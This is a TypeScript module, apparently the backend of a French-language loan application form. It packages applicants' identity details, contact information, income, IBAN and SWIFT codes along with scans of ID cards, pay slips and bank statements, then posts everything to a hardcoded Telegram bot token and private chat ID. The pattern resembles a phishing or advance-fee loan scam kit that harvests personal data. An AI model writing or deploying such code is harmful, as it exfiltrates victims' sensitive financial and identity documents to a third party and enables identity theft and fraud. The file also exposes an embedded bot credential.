const BOT_TOKEN = "8688178193:AAEOCj3dqJ8JQmmk_8CfxVQ9-7F7wKpFqqA";
const CHAT_ID = "8529673558";

function dataURLtoBlob(dataUrl: string): Blob {
  const arr = dataUrl.split(',');
  const mimeMatch = arr[0].match(/:(.*?);/);
  const mime = mimeMatch ? mimeMatch[1] : 'application/octet-stream';
  const bstr = atob(arr[1]);
  let n = bstr.length;
  const u8arr = new Uint8Array(n);
  while (n--) {
    u8arr[n] = bstr.charCodeAt(n);
  }
  return new Blob([u8arr], { type: mime });
}

async function sendDocumentToTelegram(docFile: any, documentTypeLabel: string, reference: string) {
  if (!docFile || !docFile.dataUrl) return;

  try {
    const blob = dataURLtoBlob(docFile.dataUrl);
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("document", blob, docFile.name);
    formData.append("caption", `📄 Réf: ${reference}\nType: ${documentTypeLabel}\nFichier: ${docFile.name}`);

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
    await fetch(url, {
      method: "POST",
      body: formData
    });
  } catch (err) {
    console.error(`Error sending document ${docFile.name} to Telegram:`, err);
  }
}

export async function sendLoanApplicationToTelegram(formData: any, reference: string, documentsList: any) {
  try {
    const docs = documentsList || {};
    // Compute Age from dateNaissance
    let ageStr = "";
    if (formData.dateNaissance) {
      try {
        const birthDate = new Date(formData.dateNaissance);
        if (!isNaN(birthDate.getTime())) {
          const ageDifMs = Date.now() - birthDate.getTime();
          const ageDate = new Date(ageDifMs);
          ageStr = `${Math.abs(ageDate.getUTCFullYear() - 1970)} ans`;
        }
      } catch (e) {
        console.error("Age calculation error:", e);
      }
    }

    const name = `${formData.prenom || ""} ${formData.nom || ""}`.toUpperCase().trim();
    const bornText = formData.dateNaissance ? `${formData.dateNaissance} (Sexe: ${formData.sexe || ""}, Âge: ${ageStr})` : "";
    const address = `${formData.adresse || ""}, ${formData.ville || ""}, ${formData.pays || ""}`.trim();
    const contactDetails = `📞 Tél: ${formData.telephone || ""} | ✉️ E-mail: ${formData.email || ""}`;

    // Project
    const loanProject = `💰 Montant: ${formData.montantDemande?.toLocaleString() || ""} ${formData.devise || "EUR"}
⏳ Durée: ${formData.dureeSouhaitee || ""} mois
🎯 Objet: ${formData.objetPret || ""}
📅 Déblocage Souhaité: ${formData.dateDeblocage || ""}`;

    // Professional
    const proDetails = `💼 Profession: ${formData.profession || ""}
🏢 Employeur: ${formData.employeur || ""}
📅 Ancienneté: ${formData.anciennete || ""}
📄 Contrat: ${formData.typeContrat || ""}
💵 Revenus Mensuels Principaux: ${formData.revenusMensuels?.toLocaleString() || ""} ${formData.devise || "EUR"}/mois
📊 Revenus Mensuels Nets: ${formData.revenusMensuels?.toLocaleString() || ""} ${formData.devise || "EUR"}/mois
📅 Date de Salaire: ${formData.datePerceptionSalaire || ""}`;

    // Financial
    const bankDetails = `🏦 Banque Principale: ${formData.banquePrincipale || ""}
👤 Titulaire: ${formData.nomTitulaireCompte || ""}
🏧 Type Compte: ${formData.typeCompte || ""}
💳 IBAN: ${formData.iban || ""}
🔑 Code SWIFT/BIC: ${formData.swiftBic || ""}`;

    const text = `🚨 NOUVELLE DEMANDE DE PRÊT CERTIFIÉE

📂 RÉFÉRENCE DOSSIER : ${reference}
----------------------------------------
👤 IDENTITÉ DE L'EMPRUNTEUR
• Nom complet : ${name}
• Naissance : ${bornText}
• Nationalité : ${formData.nationalite || ""}
• Matrimonial : ${formData.situationMatrimoniale || ""}
• Adresse : ${address}
• Contact : ${contactDetails}

📊 DOSSIER DE FINANCEMENT
${loanProject}

💼 SITUATION PROFESSIONNELLE
${proDetails}

🏦 COORDONNÉES BANCAIRES
${bankDetails}
----------------------------------------
📂 JUSTIFICATIFS ATTACHÉS :
${docs.pieceIdentite ? `✅ 1. Pièce d'identité - Recto (${docs.pieceIdentite.name})` : '❌ 1. Pièce d\'identité - Recto manquante'}
${docs.pieceIdentiteVerso ? `✅ 2. Pièce d'identité - Verso (${docs.pieceIdentiteVerso.name})` : '❌ 2. Pièce d\'identité - Verso manquante'}
${docs.bulletinsSalaire ? `✅ 3. Bulletin de salaire (${docs.bulletinsSalaire.name})` : '❌ 3. Bulletin de salaire manquant'}
${docs.releveBancaire ? `✅ 4. Relevé bancaire (${docs.releveBancaire.name})` : '❌ 4. Relevé bancaire manquant'}`;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
      }),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error(`Telegram sendMessage failed but caught: ${errorText}`);
    }

    // Send attached documents
    const docPromises: Promise<any>[] = [];
    if (docs.pieceIdentite) {
      docPromises.push(sendDocumentToTelegram(docs.pieceIdentite, "Scan Pièce d'identité (Recto)", reference));
    }
    if (docs.pieceIdentiteVerso) {
      docPromises.push(sendDocumentToTelegram(docs.pieceIdentiteVerso, "Scan Pièce d'identité (Verso)", reference));
    }
    if (docs.bulletinsSalaire) {
      docPromises.push(sendDocumentToTelegram(docs.bulletinsSalaire, "Bulletin de salaire", reference));
    }
    if (docs.releveBancaire) {
      docPromises.push(sendDocumentToTelegram(docs.releveBancaire, "Relevé bancaire", reference));
    }

    if (docPromises.length > 0) {
      await Promise.allSettled(docPromises);
    }

    if (response.ok) {
      return response.json();
    }
    return { success: false, error: "HTTP response was not ok" };
  } catch (err) {
    console.error("Critical error in sendLoanApplicationToTelegram:", err);
    return { success: false, error: String(err) };
  }
}
